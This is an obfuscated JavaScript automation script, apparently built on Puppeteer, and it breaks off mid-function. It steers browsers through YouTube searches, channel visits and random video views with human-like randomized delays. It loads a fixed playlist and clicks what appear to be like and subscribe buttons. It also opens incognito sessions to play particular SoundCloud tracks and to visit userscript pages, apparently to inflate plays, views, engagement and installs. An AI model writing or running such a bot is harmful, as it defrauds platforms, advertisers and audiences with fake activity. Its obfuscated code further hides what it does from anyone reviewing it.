const W = b,
  V = c,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x22f9 * 0x1 + -0xbc1 + -0x7bd * 0x3))) + i;
}

function a() {
  const bm = [
    'TixW__6Eer',
    'DY55B3v0DwjLlG',
    'bJz4WPVcGSk8',
    'W50dWPNdTe0V',
    'D_5pMqdKSs',
    'o\x20base,moo',
    'vsiDW48EAupdRmoNvG',
    'zmkDWQvaW6qeW7C2W47cQG',
    'WRRdI8kSlJ9thCk8WRTC',
    'syn_52523/',
    'CMvZCg9UC2vuzq',
    'gmoBx1ZcVCkYW787FmoB',
    'easyfork.o',
    'com/channe',
    'W7hdR39FWOhcLCobW7jbW7u',
    'BgqGCMvJB3jKla',
    'W43dTIKm',
    'enuserjs.o',
    'WQKkgmkgW5aKBfW2',
    '1r2pKoVAdj',
    'https://ww',
    'WR7cISk/W4WvhaSLl8kG',
    'WQBcP8oNzJtdTN1WjCkI',
    'oaddQ0RcPSkiWPTdW73cGG',
    'x0DSB2jHBf9oyq',
    'pts/by-sit',
    'WPrydmk8W5ldJLjesSkP',
    'ChrZlZqYnda2nG',
    'rg/en/scri',
    'ew,the\x20old',
    'C3bSAxq',
    'https://op',
    'y8kFySkMFCong8oEe8oD',
    'hNbyWPzqtxNdK8keDq'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1646 + -0x20ac + 0x36f2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * 0x85ed + 0x7f20 + 0x7bfd + (0x45d * 0x7 + -0x435 + -0x1 * -0x2042) * random()) : await standardWaitForNetIdle(f), await wait(0x4a5 * 0x4 + 0xa5 * 0x2b + 0xd * -0x20f + (-0x621 * -0x5 + -0x7c * 0x85 + 0x48d7) * random()), -0x63b * 0x4 + -0x18 * 0x17f + 0x57 * 0xb3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x9b * 0x39 + 0x37 * -0x4d + 0x2 * 0xc8), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x23a5 + 0x136a * 0x1 + 0x125a * -0x3;
}
async function randomWait() {
  return await wait(0x1 * -0x108a + 0x1 * 0x1101 + 0x1311 * 0x1 + (0xe42 + -0x622 + 0xb68) * random()), -0x2 * -0x3f + -0x7e * 0x2 + 0x1 * 0x7f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x3f * -0x46 + -0xfaf + 0x20e9, -0xb7 * -0x1c + -0xd68 * 0x2 + 0x6d3), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x17e1b * 0x1 + -0x1bf60 + 0x427db) * getRandomInt(0xfba + 0x1bd9 + -0x1 * 0x2b91, -0x2397 + 0xc8 * 0x1 + 0x22d4), h)), 0x164d + 0xe1a + -0x2466;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x111b + -0x678 * 0x6 + 0x7fd * 0x7;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1c87 + 0x1 * -0x248d + 0x807]['split']('\x20');
    for (let k = -0xb * 0x309 + -0x9a6 + 0x1 * 0x2b09; k < i['length']; k += 0x8fa + -0x517 * -0x3 + -0x4d9 * 0x5)
      j += i[k] * h[i[k + (-0x1 * -0x221b + 0x1372 + -0x358c)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2240 + -0xb * -0x383 + -0x5 * 0xdf)['map'](l => Array['from'](l['children']))['flat'](-0xbaa + 0xff4 * -0x2 + -0x73 * -0x61)['map'](l => l['childNodes'][-0x19d6 + 0x1138 + 0x89f]['childNodes'][-0x1ca * -0xe + -0x16a5 * 0x1 + -0x267]['childNodes'][-0x15f7 + -0x5e * -0x2 + 0x153c]['childNodes'][0x204b + 0x2 * 0xf44 + -0x3ed3]['childNodes'][0xe05 + -0x18b8 * 0x1 + 0xab4]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x53 * -0x77 + -0x21 * -0xc7 + -0x3c54, 0x27 * 0xfb + 0xbd5 * -0x1 + 0xdc * -0x8)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x674d + 0x5ada + 0x470b);
  const h = await getMaxTime(f),
    i = Math['min']((-0xed1c + 0x94b + 0x1ce31) * getRandomInt(-0x382 + -0x1c95 + 0x2019, 0x1 * -0x1749 + 0x1d09 + -0x5bb * 0x1), h);
  return await wait(i), -0x2d9 + -0x436 * -0x8 + -0x2 * 0xf6b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))[R(0x3, 'AKN(')](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x8 * -0x2b + -0x1e0 * -0x14 + -0x71 * 0x58]['children'][-0x1 * 0x736 + 0x212 + -0xe * -0x5e]['children'][-0x9 * 0x3b1 + -0x19d4 + 0x3b0d * 0x1]['children'][-0x1 * 0x8ac + -0xa9f + 0x134b * 0x1]['children'][-0x2364 + 0x2 * -0x6df + 0x2 * 0x1891]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2438 + 0x512 + 0x1f27 * 0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x2460 + -0x13e2 + 0x2 * 0x1c53 + (0x1f95 + 0x5 * 0x4de + -0x2d * 0x13d) * random()
  }), await wait(0x18fd + -0xb * -0x2c5 + -0x3580 * 0x1 + (0x1dbb + 0x533 * 0x5 + -0x368e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x5fe * 0x6 + -0x15 * 0x166 + 0x4154]['childNodes'][-0x1869 + 0x6 * -0x49 + 0x8 * 0x344]['childNodes'][-0x82 * 0x27 + 0xb3 * -0x33 + 0x3778]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2 * -0x720 + 0x25e0 + -0x179b]['childNodes'][0x1311 + 0x135c + -0x266d]['childNodes'][-0x2ea + 0x16aa + -0xe * 0x169]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1 * 0xf16 + 0x432 + -0x1347),
          r = -0x1ed5 + 0x222b + 0x2 * -0x1ab;
        for (let u = 0x1e0f + 0x1 * -0x180d + 0x301 * -0x2; u < q['length']; u += 0xb * -0x53 + -0x16cd + 0x1a60)
          r += q[u] * k[q[u + (-0x231d + -0x67b + 0x2999)]];
        return r;
      }(n);
  });
  await wait((0x11 * -0x1a5 + -0x8 * 0xbd1 + -0x133 * -0x97) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x6438 + -0x1d030 + 0x63d9 * 0x8) * getRandomInt(0x12e7 + -0x347 + -0xf9f, 0x1 * -0xb5d + 0x91d * -0x4 + 0x2fdb), h + (-0x21cf + -0x129d + -0x23fa * -0x2));
  return await wait(i), -0xf3 * -0x22 + -0x5 * 0x14b + 0x9 * -0x2de;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1505 + -0x1d23 * 0x1 + -0x217 * -0x18), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2 * -0x1151 + 0x201 + 0x2c59 * 0x1 + (-0x6c5 * 0x2 + 0x26af + -0x1 * 0x153d) * Math['random']());
    });
  }, 0x1 * 0xda7 + -0x4f * -0x17 + 0x698);
  await wait(-0x6c425 + -0x639a8 + 0x1191ad);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * -0x21f7 + -0x1 * -0x8186 + -0x1 * -0x8ad1) * getRandomInt(0xb97 * -0x1 + 0x1 * 0x83 + -0x2c6 * -0x4, 0x155f + -0x53 + -0x14f3)), clearInterval(h), 0x2492 + -0x727 * 0x5 + 0x67 * -0x2;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xf39 + 0x18a7 + 0xe8 * -0x2c);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xf39 + 0x18a7 + 0xe8 * -0x2c);
    let h = e[f];
    if (c['DIDJdQ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x218e * -0x1 + -0x1 * 0x1955 + -0x839, r, s, t = -0x24be + -0x17 * -0x8b + -0x7 * -0x377; s = m['charAt'](t++); ~s && (r = q % (0xf5e + -0x26af * -0x1 + -0x3609) ? r * (-0x20ac + -0x6ba + 0x27a6) + s : s, q++ % (0x1530 + 0xae6 + -0x2012)) ? o += String['fromCharCode'](0x517 * 0x2 + -0x167 + -0x2 * 0x3e4 & r >> (-(0x4a5 * 0x4 + 0xa5 * 0x2b + 0x11 * -0x2b9) * q & -0xf53 * -0x1 + -0x3e * 0x85 + 0x10e9)) : -0x63b * 0x4 + -0x18 * 0x17f + 0x44 * 0xe5) {
          s = n['indexOf'](s);
        }
        for (let u = 0x9b * 0x39 + 0x37 * -0x4d + 0x4 * -0x47e, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x23a5 + 0x136a * 0x1 + 0x1255 * -0x3))['slice'](-(0x1 * -0x108a + 0x1 * 0x1101 + 0x27 * -0x3));
        }
        return decodeURIComponent(p);
      };
      c['YFupuG'] = i, b = arguments, c['DIDJdQ'] = !![];
    }
    const j = e[0xe42 + -0x622 + -0x820],
      k = f + j,
      l = b[k];
    return !l ? (h = c['YFupuG'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x241 * -0xb + -0x47 * -0x6e + -0x374d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2ad + -0x200a + 0x22b8;
    await randomWait();
  }
  return 0x2 * -0x1ed + -0x19b7 + 0x1d92;
}

function fetchRandomSC() {
  return Math['random']() <= -0x101c + 0xe2 * -0x11 + 0x472 * 0x7 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x15c1 + 0xf * -0x19a + 0x2dc7 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2e1 * -0x1 + -0x7d1 + -0x559 * -0x2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x3 * 0xc72 + 0x1897 + -0x1 * -0xcbf;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * 0x55a3 + -0x3bd * 0x2d + 0x1025e + getRandomInt(0x3052 + 0x89a + 0x1ac, -0xb040 + 0x2ab9 + 0xfab7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x11d0 + -0x614 + -0xbbb), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1bbb + 0x466 + 0x1755;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2 * -0xb32 + -0x2 * -0x2ad + -0x1bbe, 0x1ba8 + -0x16 * 0x85 + -0x1008)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x5 * 0x46f + -0x207c + -0x3e77 * -0x1 + floor((0x4f * 0x2b + 0x2370 + -0x2ccd) * random()))), log('p2'), log(await s['evaluate'](() => {
        const S = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x502 * 0x31d741 + -0x2 * 0x1eac85e9 + -0x10 * 0x3c3ee7b),
          -0x1d7795 + 0xbd06e0 + 0xa8519 * -0x3,
          0xe57d + -0x4c1f + -0x195e,
          -0xa * 0x1c3 + 0x1000 + 0x21e
        ], y = [
          0x28 * -0x26 + 0x29 * -0xd + 0x81d,
          -0x1046 * -0x1 + 0x14c * -0x14 + 0x2 * 0x4dd,
          -0x1d8f + 0x7 * -0x26f + 0x2ea0,
          -0x10 * -0x5c + -0x1990 + 0x13d0
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1c7c + -0x1812 + 0x3 * 0x1185)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2ed * 0xb + -0x114d + 0x317c * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xeee + 0x6f * 0x1a + -0x1a34) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x5b * -0x61 + -0x1 * -0x1424 + -0x369f] = A[-0x909 * 0x3 + 0x1 * 0x202d + -0x2 * 0x281] = A[0x1b55 * 0x1 + 0x10c + -0x1c60] = A[0x593 * -0x4 + 0x9 * 0xd5 + -0x1 * -0xed1] = A[0x1984 * 0x1 + -0x193 + -0xbf7 * 0x2] = A[0x1432 + -0x8df + -0xb4f] = A[-0x22a5 * 0x1 + 0xde7 + 0x427 * 0x5] = A[-0x5 * 0x525 + 0xcca + -0x1f * -0x6b] = A[-0x1 * 0x14ab + 0x18c3 + -0x411] = A[-0x18a5 + -0x1a0 * -0x3 + 0x25 * 0x89] = A[-0x1fcb * 0x1 + -0x290 + 0x2264] = A[0xaf * -0xf + 0x1b7b + -0x1130] = A[0x1 * 0x1f6a + -0x2010 + -0x3b * -0x3] = A[0xf8f * 0x1 + -0x1 * -0x1985 + -0x1484 * 0x2] = A[-0x2bd + 0x14a8 + -0x2 * 0x8ef] = A[0x1 * 0x25f2 + 0x7 * -0x40f + 0x3 * -0x329] = A[-0x23c4 + -0x54f * 0x7 + -0x15a * -0x36] = -0x1 * 0xf6b + -0x2 * -0x9fd + -0x48f, this['blocks'] = A) : this['blocks'] = [
                0x4e1 + -0x1 * 0x194 + -0xd * 0x41,
                -0xcc5 + 0x1 * 0x679 + 0x4 * 0x193,
                -0xdd9 + 0x1580 + -0x28d * 0x3,
                -0x9d1 * -0x1 + 0x133e + -0xad * 0x2b,
                -0x2522 + -0x19a7 * 0x1 + 0x3ec9,
                0x79 * -0xb + -0x1 * 0x1d69 + 0x1 * 0x229c,
                0x3 * 0x66a + 0x25c3 * -0x1 + 0x1285,
                -0x13dd + -0xa7 * 0x11 + 0x7 * 0x46c,
                0x65f * 0x1 + 0x46 * -0x7 + -0x475,
                0x1bf1 + 0x18a8 + -0x5 * 0xa85,
                -0xf * 0x178 + 0xd * 0x239 + -0x1 * 0x6dd,
                0x1575 + -0x59 * 0x3b + -0x1 * 0xf2,
                0x79 + 0x1948 + -0x19c1,
                0x1e94 + -0x1 * 0x4d1 + -0x19c3,
                -0x1aa9 * -0x1 + -0x2f9 * -0xc + -0x6ed * 0x9,
                0x1 * 0xd39 + 0xe68 * 0x1 + -0x1ba1,
                -0xf45 + 0x73 * -0x3b + 0x29c6
              ], this['h0'] = -0x563594d4 + 0x57feeaf9 * 0x1 + 0x2 * 0x32bde66e, this['h1'] = -0x1901b40cb * 0x1 + -0x127ba17 * -0x167 + -0x4b10fcb1 * -0x3, this['h2'] = 0x1 * -0xfdb2b9e + 0xfe36747f + -0x55a06be3, this['h3'] = 0x31a4479 * 0x2 + -0x14663ae * -0x18 + -0x149b8ccc, this['h4'] = -0xaf48c432 + -0x3a436206 + 0x1ad5f0828, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x3a4 * 0x1 + 0x21 * -0xbe + 0x14da, this['finalized'] = this['hashed'] = 0xbe7 + -0x527 * 0x4 + 0x8b5, this['first'] = -0x2 * 0x50b + 0xd * 0x5c + 0x56b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x92 * -0x22 + 0x1247 + -0x25ab, O = J['length'] || -0x1438 + 0x2 * 0x10fe + -0xdc4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1e85 + -0x1bc6 + -0x2bf, P[-0x89f * 0x2 + -0x4c + 0x118a] = this['block'], P[-0x1107 * -0x1 + -0x258 + 0xe9f * -0x1] = P[0x3 * -0x847 + 0x3 * -0xaa6 + 0x38c8] = P[-0x20 * -0xa5 + -0x1 * -0xfa1 + -0x407 * 0x9] = P[-0x25 * 0xe6 + -0x3e * -0x93 + 0x1 * -0x259] = P[-0x1 * -0x130d + 0x717 * -0x2 + -0x1 * 0x4db] = P[-0x618 + 0x97 * 0x2f + -0x159c] = P[-0x25cb + 0x49 * -0x35 + -0x34ee * -0x1] = P[0x59 * 0x6d + -0x218b * 0x1 + 0x9 * -0x7b] = P[0x1ce * 0xe + 0x1 * 0xf34 + -0xa1c * 0x4] = P[-0x45 * -0x8d + -0x12cd + -0x132b * 0x1] = P[-0x1efd + 0xb96 * -0x1 + 0x2a9d] = P[0x1 * 0x1c51 + 0x2 * 0x3f1 + -0x2428] = P[-0x170a + 0x1b * 0x44 + 0xfea] = P[-0x2450 + -0x102e + -0x1 * -0x348b] = P[-0x61 * 0x4b + 0x2f9 * 0x8 + 0x4b1] = P[-0x2 * -0xe52 + -0x8cc + -0x13c9] = 0xc * -0x1eb + 0x5 * 0x68e + -0x4e1 * 0x2), K) {
                    for (N = this['start']; M < O && N < -0x2 * 0x98b + 0x4 * 0x5d5 + 0x1 * -0x3fe; ++M)
                      P[N >> 0x1b5 * -0xd + -0xdc9 + -0x292 * -0xe] |= J[M] << y[0xd79 * 0x1 + 0x1fc7 + -0x2d3d * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x17 * -0x5c + 0x10d5 * -0x1 + 0x1959; ++M)
                      (L = J['charCodeAt'](M)) < 0x102f + -0x12b2 * 0x2 + 0x15b5 ? P[N >> 0x3b7 * 0x9 + 0x26ca + -0x1 * 0x4837] |= L << y[-0x8 * -0x42f + 0x425 * 0x4 + -0x3209 & N++] : L < 0x29 * 0xcd + -0x349 * 0x7 + 0xa * -0x2f ? (P[N >> 0x2426 + 0x1f3d + -0x2f * 0x16f] |= (0x2024 + -0x182 * 0x7 + -0x14d6 | L >> -0x2087 * 0x1 + -0x25ed + -0x177e * -0x3) << y[0xea0 + 0xb47 + -0x19e4 & N++], P[N >> -0x8b * -0x47 + -0x14f5 + -0x8cb * 0x2] |= (0xfde + -0x957 + -0x607 | 0x3b + -0x1261 + 0x1265 & L) << y[0x185e + 0x1fb3 + -0x380e & N++]) : L < -0x5fcb + 0x1 * -0x1ece + 0x16d7 * 0xf || L >= 0x13fb2 + -0x43 * 0x54d + 0x10375 ? (P[N >> 0x11e0 + 0xcd7 + 0x1 * -0x1eb5] |= (0x2 * -0x2 + 0x2 * 0x11eb + -0x22f2 | L >> 0xef3 + -0xcbb + -0x22c) << y[0x195a + 0x1567 + 0xc1 * -0x3e & N++], P[N >> 0x3f4 + -0x59d * 0x3 + -0x1 * -0xce5] |= (-0x1 * -0x151f + 0xdf6 + 0x2a9 * -0xd | L >> -0xa * -0xb9 + 0x1415 * 0x1 + -0x1b49 & 0x7f * 0xd + -0x8cb * 0x3 + 0x142d) << y[0x683 + -0x16c7 + -0x1 * -0x1047 & N++], P[N >> 0x13d6 + 0x131a + -0x26ee] |= (0x488 + -0x1406 + 0xffe | -0x294 + -0x157 * -0x7 + -0x68e & L) << y[-0x29 * 0x25 + -0x66 * -0x4f + 0xe * -0x1d3 & N++]) : (L = 0x1a * -0x8ba + -0x56ef + -0x3 * -0xbdf1 + ((-0x1 * 0xc1 + 0x1 * 0x1505 + -0x55 * 0x31 & L) << 0x23eb + 0x1 * 0x132e + -0x370f | 0x17a3 + -0x29f + 0x1105 * -0x1 & J['charCodeAt'](++M)), P[N >> -0x2019 + 0x227a + -0x25f] |= (0x19b5 * -0x1 + 0x1175 + 0x930 | L >> 0x1694 + 0x164d + -0x2ccf) << y[0xb * -0x1bb + -0x1f38 + 0x3244 & N++], P[N >> -0xa * 0x234 + -0xd25 + -0x232f * -0x1] |= (-0x146f + 0x25 * -0x11 + 0x1764 | L >> -0x1302 + 0x2 * 0x212 + 0x775 * 0x2 & -0x1e6a + -0x25f + 0x2108) << y[-0x35b + 0xf88 + -0xc2a & N++], P[N >> 0x2 * 0xf03 + -0x2 * 0x1af + 0xd53 * -0x2] |= (0x1c17 + 0x5 * 0x35b + 0x162f * -0x2 | L >> -0x23f7 + 0x1 * 0x2339 + -0x4 * -0x31 & -0x1fc0 + -0x11b * 0x19 + 0x3ba2) << y[0x1 * 0x3eb + -0x1c4a + 0x1 * 0x1862 & N++], P[N >> -0x11bc + -0x2 * 0x1de + 0x157a] |= (-0x4a3 * -0x2 + -0x73 * 0x23 + -0x3 * -0x251 | -0x1eaf * 0x1 + -0x648 * -0x5 + -0x7a & L) << y[0x26d9 + -0xaa * -0x1e + -0x1396 * 0x3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x24c2 + 0x1 * -0x153c + 0x3a3e ? (this['block'] = P[0x35b + -0x5f6 + 0x2ab], this['start'] = N - (-0x1b87 + 0x1 * -0x1af9 + 0x36c0), this['hash'](), this['hashed'] = 0xd2e * 0x1 + -0x1fa8 + -0x53 * -0x39) : this['start'] = N;
                }
                return this['bytes'] > -0xee1653df + -0x1da6f53e7 + 0x19 * 0x26bdaa8d && (this['hBytes'] += this['bytes'] / (0x8 * 0x2be38f62 + 0x8d7dc * 0x1822 + 0x2fbcd * -0x6768) << 0xf3e * -0x2 + -0x26ef + 0x557 * 0xd, this['bytes'] = this['bytes'] % (-0x16883046c + -0x4f0 * -0x1a5a84 + 0x1e66418ac)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1969 + -0x577 * 0x1 + 0x11 * 0x1d1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
